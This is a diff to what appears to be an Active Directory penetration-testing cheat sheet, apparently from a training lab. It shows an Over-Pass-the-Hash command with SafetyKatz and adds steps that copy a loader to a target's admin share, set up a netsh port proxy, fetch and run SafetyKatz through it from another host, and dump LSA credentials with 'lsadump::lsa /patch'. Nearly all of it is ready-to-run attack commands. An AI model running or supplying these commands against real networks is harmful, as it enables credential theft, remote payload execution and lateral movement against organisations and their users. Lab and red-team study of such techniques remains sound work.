@@ -283,6 +283,16 @@ Over-Pass-the-Hash (SafetyKatz.exe)
 ```powershell
 C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:user /domain:domain /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /run:cmd.exe" "exit"
 ```
+Copy Loader to target system, modify local firewall rules, and execute SafetyKatz 
+```powershell
+echo F | xcopy C:\AD\Tools\Loader.exe \\target\C$\Users\Public\Loader.exe /Y
+#On Target System
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
+#Execute Mimikatz
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
+#Dump creds
+lsadump::lsa /patch
+```
 ## Lateral Movement
 All the PS remoting 
 
